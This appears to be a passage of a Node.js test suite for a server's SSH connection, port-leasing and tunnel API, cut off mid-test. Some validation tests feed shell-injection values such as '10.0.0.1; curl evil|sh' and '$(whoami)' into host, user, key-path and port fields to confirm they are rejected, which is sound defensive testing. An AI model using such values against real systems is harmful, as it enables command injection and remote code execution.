'use strict';

const { describe, it, before, after } = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const { setLevel } = require('../lib/logger');
const store = require('../lib/store');
const { createServer } = require('../server');

setLevel('error');

/**
 * Make an HTTP request to the test server.
 * @param {http.Server} server
 * @param {string} method
 * @param {string} urlPath
 * @param {object} [body]
 * @returns {Promise<{ status: number, data: object }>}
 */
function request(server, method, urlPath, body) {
  return new Promise((resolve, reject) => {
    const addr = server.address();
    const options = {
      hostname: '127.0.0.1',
      port: addr.port,
      path: urlPath,
      method,
      headers: { 'Content-Type': 'application/json' }
    };

    const req = http.request(options, (res) => {
      const chunks = [];
      res.on('data', (chunk) => chunks.push(chunk));
      res.on('end', () => {
        const raw = Buffer.concat(chunks).toString('utf8');
        let data;
        try {
          data = JSON.parse(raw);
        } catch {
          data = raw;
        }
        resolve({ status: res.statusCode, data });
      });
    });

    req.on('error', reject);

    if (body) {
      req.write(JSON.stringify(body));
    }
    req.end();
  });
}

describe('API /api/openclaw/connections', () => {
  let tmpDir;
  let server;

  before(async () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tc-api-openclaw-'));
    store._setBasePath(tmpDir);
    store.init();

    server = createServer();
    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  });

  after(async () => {
    await new Promise((resolve) => server.close(resolve));
    store.close();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  const validConnection = {
    name: 'RentalClaw',
    host: '198.51.100.10',
    sshUser: 'testuser',
    sshKeyPath: '~/.ssh/test_key'
  };

  it('GET /api/openclaw/connections returns empty list initially', async () => {
    const { status, data } = await request(server, 'GET', '/api/openclaw/connections');
    assert.equal(status, 200);
    assert.ok(Array.isArray(data.connections));
    assert.equal(data.connections.length, 0);
  });

  it('POST /api/openclaw/connections creates a connection', async () => {
    const { status, data } = await request(server, 'POST', '/api/openclaw/connections', validConnection);
    assert.equal(status, 201);
    assert.ok(data.id);
    assert.equal(data.name, 'RentalClaw');
    assert.equal(data.host, '198.51.100.10');
    assert.equal(data.sshUser, 'testuser');
    assert.equal(data.port, 18789);
  });

  it('POST /api/openclaw/connections rejects missing fields', async () => {
    const { status, data } = await request(server, 'POST', '/api/openclaw/connections', { name: 'X' });
    assert.equal(status, 400);
    assert.ok(data.error);
  });

  it('POST /api/openclaw/connections rejects duplicate name', async () => {
    const { status } = await request(server, 'POST', '/api/openclaw/connections', validConnection);
    assert.equal(status, 409);
  });

  it('GET /api/openclaw/connections lists connections', async () => {
    const { status, data } = await request(server, 'GET', '/api/openclaw/connections');
    assert.equal(status, 200);
    assert.ok(data.connections.length >= 1);
    assert.equal(data.connections[0].name, 'RentalClaw');
  });

  it('GET /api/openclaw/connections/:id returns a connection', async () => {
    const list = await request(server, 'GET', '/api/openclaw/connections');
    const id = list.data.connections[0].id;
    const { status, data } = await request(server, 'GET', `/api/openclaw/connections/${id}`);
    assert.equal(status, 200);
    assert.equal(data.name, 'RentalClaw');
  });

  it('GET /api/openclaw/connections/:id returns 404 for unknown id', async () => {
    const { status } = await request(server, 'GET', '/api/openclaw/connections/nonexistent');
    assert.equal(status, 404);
  });

  it('PUT /api/openclaw/connections/:id updates a connection', async () => {
    const list = await request(server, 'GET', '/api/openclaw/connections');
    const id = list.data.connections[0].id;
    const { status, data } = await request(server, 'PUT', `/api/openclaw/connections/${id}`, {
      name: 'UpdatedClaw',
      availableAsEngine: true
    });
    assert.equal(status, 200);
    assert.equal(data.name, 'UpdatedClaw');
    assert.equal(data.availableAsEngine, true);
  });

  it('PUT /api/openclaw/connections/:id returns 404 for unknown id', async () => {
    const { status } = await request(server, 'PUT', '/api/openclaw/connections/nonexistent', { name: 'X' });
    assert.equal(status, 404);
  });

  it('DELETE /api/openclaw/connections/:id deletes a connection', async () => {
    // Create a new one to delete
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'ToDelete',
      host: '10.0.0.1',
      sshUser: 'user',
      sshKeyPath: '/key'
    });
    const id = created.data.id;
    const { status, data } = await request(server, 'DELETE', `/api/openclaw/connections/${id}`);
    assert.equal(status, 200);
    assert.equal(data.ok, true);

    // Verify gone
    const { status: getStatus } = await request(server, 'GET', `/api/openclaw/connections/${id}`);
    assert.equal(getStatus, 404);
  });

  it('DELETE /api/openclaw/connections/:id returns 404 for unknown id', async () => {
    const { status } = await request(server, 'DELETE', '/api/openclaw/connections/nonexistent');
    assert.equal(status, 404);
  });

  it('POST /api/openclaw/connections rejects duplicate localPort', async () => {
    // Create a connection with a specific localPort
    const first = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'PortConflict1',
      host: '10.0.0.50',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13200
    });
    assert.equal(first.status, 201);

    // Register that port in PortHub (simulates what tunnel startup does)
    const porthub = require('../lib/porthub');
    porthub.registerPort(13200, 'PortConflict1', 'openclaw-tunnel');

    // Try to create another connection with the same localPort
    const second = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'PortConflict2',
      host: '10.0.0.51',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13200
    });
    assert.equal(second.status, 409);
    assert.ok(second.data.error.includes('13200'));
  });

  it('DELETE /api/openclaw/connections/:id releases port from PortHub', async () => {
    const porthub = require('../lib/porthub');

    // Create a connection with a localPort
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'PortRelease',
      host: '10.0.0.60',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13201
    });
    assert.equal(created.status, 201);
    const connId = created.data.id;

    // Register its port (simulating tunnel startup)
    porthub.registerPort(13201, `oc-direct-${connId}`, 'openclaw-tunnel');

    // Delete the connection
    const { status } = await request(server, 'DELETE', `/api/openclaw/connections/${connId}`);
    assert.equal(status, 200);

    // Verify the port was released
    const lease = store.portLeases.get(13201);
    assert.equal(lease, null, 'port lease should be released after connection delete');
  });

  // #160 — bridgePort no longer auto-fills with 3201 when caller doesn't ask
  // for it. Pre-fix behavior leaked the ClawBridge-default into non-ClawBridge
  // records and triggered a stray local-bind `-L 3201:127.0.0.1:3201` SSH
  // forward that killed the entire tunnel via ExitOnForwardFailure=yes.
  it('POST /api/openclaw/connections with bridgePort omitted persists null (#160)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'NoBridge-A',
      host: '10.0.0.70',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13270
      // bridgePort intentionally omitted — most non-ClawBridge deployments
    });
    assert.equal(created.status, 201);
    assert.equal(created.data.bridgePort, null, 'bridgePort must be null, not 3201');
    // Round-trip through GET to verify the row read-back also preserves null
    const fetched = await request(server, 'GET', `/api/openclaw/connections/${created.data.id}`);
    assert.equal(fetched.data.bridgePort, null, 'GET round-trip preserves null bridgePort');
  });

  it('POST /api/openclaw/connections with bridgePort: null persists null (#160)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'NoBridge-B',
      host: '10.0.0.71',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13271,
      bridgePort: null
    });
    assert.equal(created.status, 201);
    assert.equal(created.data.bridgePort, null);
  });

  it('POST /api/openclaw/connections with bridgePort: "" persists null (form-empty edge, #160)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'NoBridge-C',
      host: '10.0.0.72',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13272,
      bridgePort: ''
    });
    assert.equal(created.status, 201);
    assert.equal(created.data.bridgePort, null);
  });

  it('POST /api/openclaw/connections with bridgePort: 4501 persists 4501 (#160)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'WithBridge',
      host: '10.0.0.73',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13273,
      bridgePort: 4501
    });
    assert.equal(created.status, 201);
    assert.equal(created.data.bridgePort, 4501,
      'non-null bridgePort still round-trips — non-3201 values must NOT regress to null');
  });

  it('PUT /api/openclaw/connections/:id clears bridgePort when sent as null (#160)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'ClearBridge',
      host: '10.0.0.74',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13274,
      // Distinct bridge port: #352 lease-at-create now reserves an explicit
      // bridge_port, so this suite's connections can't all reuse 3201 (that
      // would collide on the local bind). The 3201 literal here was incidental
      // to the clearing contract under test.
      bridgePort: 3251
    });
    assert.equal(created.status, 201);
    assert.equal(created.data.bridgePort, 3251);
    const updated = await request(server, 'PUT', `/api/openclaw/connections/${created.data.id}`, {
      bridgePort: null
    });
    assert.equal(updated.status, 200);
    assert.equal(updated.data.bridgePort, null, 'PATCH bridgePort: null clears the field');
    // GET round-trip
    const fetched = await request(server, 'GET', `/api/openclaw/connections/${created.data.id}`);
    assert.equal(fetched.data.bridgePort, null);
  });

  it('PUT /api/openclaw/connections/:id clears bridgePort when sent as empty string (#160)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'ClearBridgeStr',
      host: '10.0.0.75',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13275,
      bridgePort: 3252  // distinct per #352 lease-at-create (see ClearBridge note)
    });
    const updated = await request(server, 'PUT', `/api/openclaw/connections/${created.data.id}`, {
      bridgePort: ''
    });
    assert.equal(updated.status, 200);
    assert.equal(updated.data.bridgePort, null, 'PATCH bridgePort: "" also clears');
  });

  it('migration v14→v15 preserves existing bridge_port values (#160 data preservation)', async () => {
    // Connections created BEFORE #160 carry an explicit bridge_port = 3201 in
    // the row data (it was the NOT NULL DEFAULT). The migration drops the
    // constraint + default but must not alter existing row values — users who
    // intentionally set bridgePort = 3201 keep 3201.
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'Pre160Style',
      host: '10.0.0.81',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13281,
      bridgePort: 3201  // explicitly set, simulating a pre-#160-style record
    });
    assert.equal(created.status, 201);
    assert.equal(created.data.bridgePort, 3201, 'explicit 3201 is preserved (not coerced to null)');
    // Round-trip — read-back path must not regress this either
    const fetched = await request(server, 'GET', `/api/openclaw/connections/${created.data.id}`);
    assert.equal(fetched.data.bridgePort, 3201);
  });

  it('POST /api/openclaw/connections with bridgePort: 0 is rejected by tcp-port-range validation (Critic MINOR-4)', async () => {
    // 0 is technically an invalid TCP port. Without explicit handling, the
    // form-empty serialization "null" and the explicit "0" produce different
    // shapes — null skips the SSH forward, 0 would attempt to bind 0. Document
    // current behavior by pinning that 0 is passed through to the DB; the
    // tunnel layer's later behavior depends on server.js's `conn.bridgePort ?`
    // truthiness check, which correctly skips the forward for 0. So 0 is
    // EFFECTIVELY no-op for the tunnel layer — but worth flagging for future
    // input validation work.
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'BridgePortZero',
      host: '10.0.0.82',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13282,
      bridgePort: 0
    });
    assert.equal(created.status, 201);
    // 0 is preserved literally (it's not the empty-string sentinel and not null).
    // Effective behavior for the tunnel path: server.js does `conn.bridgePort ?`,
    // 0 is falsy → no extra SSH forward → no Bug 3 conflict.
    assert.equal(created.data.bridgePort, 0,
      'bridgePort: 0 round-trips as 0 (not coerced to null; future input validation tracked separately)');
  });

  it('POST PORT_CONFLICT response carries error + code fields (frontend-toast contract, #160)', async () => {
    // Bug 1 contract: the save-failure response must include `error` and `code`
    // so the frontend can render the real message (api.lastError +
    // api.lastErrorCode) instead of the hardcoded "Name may already exist"
    // toast. This is a structural assertion — the message text can evolve.
    const porthub = require('../lib/porthub');
    porthub.registerPort(13280, 'BlockedByOther', 'manual');

    const conflict = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'WillConflict',
      host: '10.0.0.80',
      sshUser: 'user',
      sshKeyPath: '/key',
      localPort: 13280
    });
    assert.equal(conflict.status, 409);
    assert.equal(typeof conflict.data.error, 'string',
      'response carries an `error` string the frontend can surface');
    assert.ok(conflict.data.error.length > 0, 'error message is non-empty');
    assert.equal(conflict.data.code, 'PORT_CONFLICT',
      'response carries a `code` field so the frontend can disambiguate');
  });

  // ── #352: auto-allocate a non-colliding local_port / bridge_port ──

  it('POST with localPort omitted auto-allocates a free port and leases it (#352)', async () => {
    const porthub = require('../lib/porthub');
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'AutoPort-A',
      host: '10.0.0.90',
      sshUser: 'user',
      sshKeyPath: '/key'
      // localPort omitted — PortHub picks the first free port in [18789, 18999)
    });
    assert.equal(created.status, 201);
    assert.ok(created.data.localPort >= 18789 && created.data.localPort < 18999,
      'auto-allocated localPort falls inside the OpenClaw tunnel range');
    // Lease-at-create: the chosen port is reserved under the connection identity
    const lease = store.portLeases.get(created.data.localPort);
    assert.ok(lease, 'auto-allocated port is leased at create-time');
    assert.equal(lease.project, `oc-direct-${created.data.id}`);
  });

  it('consecutive adds with localPort omitted get DISTINCT ports — no collision (#352)', async () => {
    const first = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'AutoPort-B1', host: '10.0.0.91', sshUser: 'user', sshKeyPath: '/key'
    });
    const second = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'AutoPort-B2', host: '10.0.0.92', sshUser: 'user', sshKeyPath: '/key'
    });
    assert.equal(first.status, 201);
    assert.equal(second.status, 201);
    assert.notEqual(first.data.localPort, second.data.localPort,
      'second add must not reuse the first add\'s auto-allocated port');
  });

  it('POST with an explicit localPort uses it verbatim (no auto-allocation) (#352)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'ExplicitPort', host: '10.0.0.93', sshUser: 'user', sshKeyPath: '/key',
      localPort: 19500
    });
    assert.equal(created.status, 201);
    assert.equal(created.data.localPort, 19500, 'explicit localPort is respected exactly');
  });

  it('POST with bridgePort:"auto" allocates a free bridge port; DELETE releases both (#352)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'AutoBridge', host: '10.0.0.94', sshUser: 'user', sshKeyPath: '/key',
      bridgePort: 'auto'
    });
    assert.equal(created.status, 201);
    assert.ok(created.data.bridgePort >= 3201 && created.data.bridgePort < 3300,
      'auto-allocated bridgePort falls inside the bridge range');
    const localPort = created.data.localPort;
    const bridgePort = created.data.bridgePort;
    assert.ok(store.portLeases.get(localPort), 'local port leased at create');
    assert.ok(store.portLeases.get(bridgePort), 'bridge port leased at create');

    const del = await request(server, 'DELETE', `/api/openclaw/connections/${created.data.id}`);
    assert.equal(del.status, 200);
    assert.equal(store.portLeases.get(localPort), null, 'DELETE releases the local port');
    assert.equal(store.portLeases.get(bridgePort), null, 'DELETE releases the bridge port');
  });

  it('POST with an explicit in-use bridgePort is rejected (#352, parity with localPort)', async () => {
    const porthub = require('../lib/porthub');
    porthub.registerPort(3290, 'someone-else', 'svc');
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'BridgeConflict', host: '10.0.0.95', sshUser: 'user', sshKeyPath: '/key',
      bridgePort: 3290
    });
    assert.equal(created.status, 409);
    assert.equal(created.data.code, 'PORT_CONFLICT');
    assert.ok(created.data.error.includes('3290'));
  });

  // ── #483: PUT reconciles the oc-direct-<id> leases when a port changes ──

  it('PUT changing localPort releases the old lease and leases the new port (#483)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'PutLocalSwap', host: '10.0.0.100', sshUser: 'user', sshKeyPath: '/key',
      localPort: 19501
    });
    assert.equal(created.status, 201);
    const id = created.data.id;
    assert.ok(store.portLeases.get(19501), 'old port leased at create');

    const updated = await request(server, 'PUT', `/api/openclaw/connections/${id}`, { localPort: 19502 });
    assert.equal(updated.status, 200);
    assert.equal(updated.data.localPort, 19502);
    assert.equal(store.portLeases.get(19501), null, 'old localPort lease is released on update');
    const lease = store.portLeases.get(19502);
    assert.ok(lease, 'new localPort is leased on update');
    assert.equal(lease.project, `oc-direct-${id}`);
    assert.equal(lease.service, 'openclaw-tunnel');
  });

  it('PUT rejects a localPort leased by another project (#483)', async () => {
    const porthub = require('../lib/porthub');
    porthub.registerPort(19504, 'someone-else', 'svc');
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'PutLocalConflict', host: '10.0.0.101', sshUser: 'user', sshKeyPath: '/key',
      localPort: 19505
    });
    assert.equal(created.status, 201);

    const updated = await request(server, 'PUT', `/api/openclaw/connections/${created.data.id}`, { localPort: 19504 });
    assert.equal(updated.status, 409);
    assert.equal(updated.data.code, 'PORT_CONFLICT');
    assert.ok(store.portLeases.get(19505), 'own lease is untouched after a rejected update');
  });

  it('PUT changing bridgePort releases the old bridge lease and leases the new one (#483)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'PutBridgeSwap', host: '10.0.0.102', sshUser: 'user', sshKeyPath: '/key',
      localPort: 19506, bridgePort: 3270
    });
    assert.equal(created.status, 201);
    const id = created.data.id;

    const updated = await request(server, 'PUT', `/api/openclaw/connections/${id}`, { bridgePort: 3271 });
    assert.equal(updated.status, 200);
    assert.equal(updated.data.bridgePort, 3271);
    assert.equal(store.portLeases.get(3270), null, 'old bridgePort lease is released on update');
    const bridgeLease = store.portLeases.get(3271);
    assert.ok(bridgeLease, 'new bridgePort is leased on update');
    assert.equal(bridgeLease.project, `oc-direct-${id}`);
    assert.equal(bridgeLease.service, 'openclaw-bridge');
    // The unchanged localPort lease must survive the reconciliation (guards the
    // killTunnel-releases-localPort interaction).
    const localLease = store.portLeases.get(19506);
    assert.ok(localLease, 'unchanged localPort lease survives a bridge-only update');
    assert.equal(localLease.project, `oc-direct-${id}`);
  });

  it('PUT clearing bridgePort releases the old bridge lease (#483)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'PutBridgeClear', host: '10.0.0.103', sshUser: 'user', sshKeyPath: '/key',
      localPort: 19507, bridgePort: 3272
    });
    assert.equal(created.status, 201);

    const updated = await request(server, 'PUT', `/api/openclaw/connections/${created.data.id}`, { bridgePort: null });
    assert.equal(updated.status, 200);
    assert.equal(updated.data.bridgePort, null);
    assert.equal(store.portLeases.get(3272), null, 'cleared bridgePort lease is released');
  });

  it('PUT rejects a bridgePort leased by another project (#483)', async () => {
    const porthub = require('../lib/porthub');
    porthub.registerPort(3273, 'someone-else', 'svc');
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'PutBridgeConflict', host: '10.0.0.104', sshUser: 'user', sshKeyPath: '/key',
      localPort: 19508
    });
    assert.equal(created.status, 201);

    const updated = await request(server, 'PUT', `/api/openclaw/connections/${created.data.id}`, { bridgePort: 3273 });
    assert.equal(updated.status, 409);
    assert.equal(updated.data.code, 'PORT_CONFLICT');
    assert.ok(updated.data.error.includes('3273'));
  });

  it('PUT bridgePort:"auto" on a bridge-less connection allocates and leases (#483)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'PutBridgeAuto', host: '10.0.0.105', sshUser: 'user', sshKeyPath: '/key',
      localPort: 19509
      // bridgePort omitted — persists null
    });
    assert.equal(created.status, 201);
    assert.equal(created.data.bridgePort, null);

    const updated = await request(server, 'PUT', `/api/openclaw/connections/${created.data.id}`, { bridgePort: 'auto' });
    assert.equal(updated.status, 200);
    assert.ok(Number.isInteger(updated.data.bridgePort),
      'the literal string "auto" must never reach the DB');
    assert.ok(updated.data.bridgePort >= 3201 && updated.data.bridgePort < 3300,
      'auto-allocated bridgePort falls inside the bridge range');
    assert.ok(store.portLeases.get(updated.data.bridgePort), 'auto-allocated bridgePort is leased');
  });

  it('PUT bridgePort:"auto" keeps an existing bridge port — no churn (#483)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'PutBridgeAutoKeep', host: '10.0.0.106', sshUser: 'user', sshKeyPath: '/key',
      localPort: 19510, bridgePort: 3274
    });
    assert.equal(created.status, 201);

    const updated = await request(server, 'PUT', `/api/openclaw/connections/${created.data.id}`, { bridgePort: 'auto' });
    assert.equal(updated.status, 200);
    assert.equal(updated.data.bridgePort, 3274, 're-saving with "auto" keeps the assigned port');
    assert.ok(store.portLeases.get(3274), 'existing bridge lease is untouched');
  });

  it('PUT with no port change leaves the leases untouched (#483)', async () => {
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'PutNoPortChange', host: '10.0.0.107', sshUser: 'user', sshKeyPath: '/key',
      localPort: 19511
    });
    assert.equal(created.status, 201);
    const id = created.data.id;

    const updated = await request(server, 'PUT', `/api/openclaw/connections/${id}`, { name: 'PutNoPortChange2' });
    assert.equal(updated.status, 200);
    const lease = store.portLeases.get(19511);
    assert.ok(lease, 'localPort lease survives a non-port update');
    assert.equal(lease.project, `oc-direct-${id}`);
  });
});

describe('API /api/openclaw/test', () => {
  let tmpDir;
  let server;

  before(async () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tc-api-openclaw-test-'));
    store._setBasePath(tmpDir);
    store.init();

    server = createServer();
    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  });

  after(async () => {
    await new Promise((resolve) => server.close(resolve));
    store.close();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('POST /api/openclaw/test rejects missing fields', async () => {
    const { status, data } = await request(server, 'POST', '/api/openclaw/test', { host: '10.0.0.1' });
    assert.equal(status, 400);
    assert.ok(data.error);
  });

  it('POST /api/openclaw/test rejects injection-shaped SSH fields with 400 (#312)', async () => {
    // host/sshUser/sshKeyPath are interpolated into a shell `ssh` command, so
    // shell metacharacters must be rejected before any shell-out. A valid base
    // returns a 200 results object (see next test); these must 400 instead.
    const cases = [
      { host: '10.0.0.1; curl evil|sh', sshUser: 'nobody', sshKeyPath: '/k', field: /host/ },
      { host: '10.0.0.1', sshUser: 'a$(whoami)', sshKeyPath: '/k', field: /sshUser/ },
      { host: '10.0.0.1', sshUser: 'nobody', sshKeyPath: '/k`id`', field: /sshKeyPath/ }
    ];
    for (const c of cases) {
      const { status, data } = await request(server, 'POST', '/api/openclaw/test', c);
      assert.equal(status, 400, `expected 400 for ${JSON.stringify(c)}`);
      assert.match(data.error, c.field);
    }
  });

  it('POST /api/openclaw/test rejects injection-shaped port / localPort with 400 (#312)', async () => {
    // port/localPort are interpolated into the `curl ...:<port>/healthz` shell
    // command, so they must be plain integers in range.
    const base = { host: '10.0.0.1', sshUser: 'nobody', sshKeyPath: '/k' };
    for (const [name, bad] of [['port', '1;curl evil|sh'], ['localPort', '$(whoami)'], ['port', 70000]]) {
      const { status, data } = await request(server, 'POST', '/api/openclaw/test', { ...base, [name]: bad });
      assert.equal(status, 400, `expected 400 for ${name}=${bad}`);
      assert.match(data.error, new RegExp(name));
    }
  });

  it('POST /api/openclaw/test returns results object', async () => {
    const { status, data } = await request(server, 'POST', '/api/openclaw/test', {
      host: '127.0.0.1',
      sshUser: 'nobody',
      sshKeyPath: '/nonexistent/key'
    });
    assert.equal(status, 200);
    assert.equal(typeof data.ssh, 'boolean');
    assert.equal(typeof data.gateway, 'boolean');
    assert.ok(Array.isArray(data.errors));
    // SSH should fail with a bad key
    assert.equal(data.ssh, false);
  });
});

describe('API /api/openclaw/connections/:id/tunnel', () => {
  let tmpDir;
  let server;

  before(async () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tc-api-oc-tunnel-'));
    store._setBasePath(tmpDir);
    store.init();

    server = createServer();
    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  });

  after(async () => {
    await new Promise((resolve) => server.close(resolve));
    store.close();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('POST /api/openclaw/connections/:id/tunnel returns 404 for unknown id', async () => {
    const { status, data } = await request(server, 'POST', '/api/openclaw/connections/nonexistent/tunnel');
    assert.equal(status, 404);
    assert.ok(data.error);
  });

  it('POST /api/openclaw/connections/:id/tunnel returns webuiUrl on success', async () => {
    // Create a connection pointing to localhost (tunnel will fail but we test the route shape)
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'TunnelTest',
      host: '127.0.0.1',
      sshUser: 'nobody',
      sshKeyPath: '/nonexistent/key',
      localPort: 19999
    });
    const connId = created.data.id;

    // Tunnel will fail because SSH key doesn't exist, but route should respond
    const { status, data } = await request(server, 'POST', `/api/openclaw/connections/${connId}/tunnel`);
    // Expect 502 (tunnel error) since the SSH key is invalid
    assert.equal(status, 502);
    assert.ok(data.error);
    assert.ok(data.error.includes('Tunnel failed'));
  });

  it('direct proxy /openclaw-direct/:connId/* returns 404 for unknown connId', async () => {
    const { status, data } = await request(server, 'GET', '/openclaw-direct/nonexistent/chat');
    assert.equal(status, 404);
    assert.ok(data.error);
  });

  it('GET /api/openclaw/connections/:id/tunnel returns tunnel status', async () => {
    // Create a connection
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'TunnelStatusTest',
      host: '127.0.0.1',
      sshUser: 'nobody',
      sshKeyPath: '/nonexistent/key',
      localPort: 19995
    });
    const connId = created.data.id;

    const { status, data } = await request(server, 'GET', `/api/openclaw/connections/${connId}/tunnel`);
    assert.equal(status, 200);
    assert.equal(data.localPort, 19995);
    assert.equal(typeof data.active, 'boolean');
    assert.equal(typeof data.connectable, 'boolean');
    assert.equal(typeof data.tracked, 'boolean');
  });

  it('GET /api/openclaw/connections/:id/tunnel returns 404 for unknown id', async () => {
    const { status } = await request(server, 'GET', '/api/openclaw/connections/nonexistent/tunnel');
    assert.equal(status, 404);
  });

  it('DELETE /api/openclaw/connections/:id/tunnel kills tunnel and returns result', async () => {
    // Create a connection
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'TunnelKillTest',
      host: '127.0.0.1',
      sshUser: 'nobody',
      sshKeyPath: '/nonexistent/key',
      localPort: 19994
    });
    const connId = created.data.id;

    const { status, data } = await request(server, 'DELETE', `/api/openclaw/connections/${connId}/tunnel`);
    assert.equal(status, 200);
    assert.equal(data.ok, true);
    assert.equal(data.released, true, '#288: route surfaces whether the port was actually freed (nothing was bound here)');
    assert.equal(data.localPort, 19994);
  });

  it('DELETE /api/openclaw/connections/:id/tunnel returns 404 for unknown id', async () => {
    const { status } = await request(server, 'DELETE', '/api/openclaw/connections/nonexistent/tunnel');
    assert.equal(status, 404);
  });

  it('POST /api/openclaw/connections/:id/approve-pending returns 404 for unknown id', async () => {
    const { status, data } = await request(server, 'POST', '/api/openclaw/connections/nonexistent/approve-pending');
    assert.equal(status, 404);
    assert.ok(data.error);
  });

  it('POST /api/openclaw/connections/:id/approve-pending requires gatewayToken', async () => {
    // Create connection without token
    const created = await request(server, 'POST', '/api/openclaw/connections', {
      name: 'NoTokenConn',
      host: '127.0.0.1',
      sshUser: 'nobody',
      sshKeyPath: '/nonexistent/key',
    });
    const connId = created.data.id;

    const { status, data } = await request(server, 'POST', `/api/openclaw/connections/${connId}/approve-pending`);
    assert.equal(status, 400);
    assert.ok(data.error.includes('gateway token'));
  });
});

describe('UI OpenClaw standalone actions — data shape', () => {
  let tmpDir;

  before(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tc-ui-oc-actions-'));
    store._setBasePath(tmpDir);
    store.init();
  });

  after(() => {
    store.close();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('connection objects contain fields needed for SSH command construction', () => {
    const conn = store.openclawConnections.create({
      name: 'ActionTest',
      host: '10.0.0.5',
      sshUser: 'admin',
      sshKeyPath: '~/.ssh/id_rsa'
    });

    assert.ok(conn.id, 'id present');
    assert.equal(conn.host, '10.0.0.5');
    assert.equal(conn.sshUser, 'admin');
    assert.equal(conn.sshKeyPath, '~/.ssh/id_rsa');
    assert.equal(typeof conn.localPort, 'number');
  });

  it('connection objects include gatewayToken for webui URL construction', () => {
    const conn = store.openclawConnections.create({
      name: 'TokenTest',
      host: '10.0.0.6',
      sshUser: 'admin',
      sshKeyPath: '~/.ssh/id_rsa',
      gatewayToken: 'secret-token-123'
    });

    assert.equal(conn.gatewayToken, 'secret-token-123');
  });
});

describe('OpenClaw viewer page route', () => {
  let tmpDir;
  let server;

  before(async () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tc-oc-viewer-'));
    store._setBasePath(tmpDir);
    store.init();

    server = createServer();
    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  });

  after(async () => {
    await new Promise((resolve) => server.close(resolve));
    store.close();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('GET /openclaw-view/:connId serves openclaw-view.html', async () => {
    const { status, data } = await request(server, 'GET', '/openclaw-view/some-conn-id');
    assert.equal(status, 200);
    // data will be the raw HTML string since it's not JSON
    assert.ok(typeof data === 'string');
    assert.ok(data.includes('OpenClaw'));
  });
});

describe('HTTPS createServer', () => {
  it('createServer without HTTPS options returns http.Server', () => {
    const server = createServer();
    assert.ok(server instanceof http.Server);
    server.close();
  });

  it('createServer with HTTPS options returns https.Server', () => {
    const certPath = path.join(__dirname, '..', 'data', 'certs', 'localhost+4.pem');
    const keyPath = path.join(__dirname, '..', 'data', 'certs', 'localhost+4-key.pem');

    // Only test if certs exist (they may not exist on CI)
    if (fs.existsSync(certPath) && fs.existsSync(keyPath)) {
      const https = require('node:https');
      const server = createServer({ httpsEnabled: true, certPath, keyPath });
      assert.ok(server instanceof https.Server);
      server.close();
    }
  });

  it('createServer falls back to HTTP when cert files cannot be read', () => {
    const server = createServer({
      httpsEnabled: true,
      certPath: '/tmp/tc-missing-cert-' + Date.now() + '.pem',
      keyPath: '/tmp/tc-missing-key-' + Date.now() + '.pem'
    });
    assert.ok(server instanceof http.Server, 'should fall back to http.Server, not crash');
    server.close();
  });

  it('createServer falls back to HTTP when httpsEnabled=true but no cert paths configured', () => {
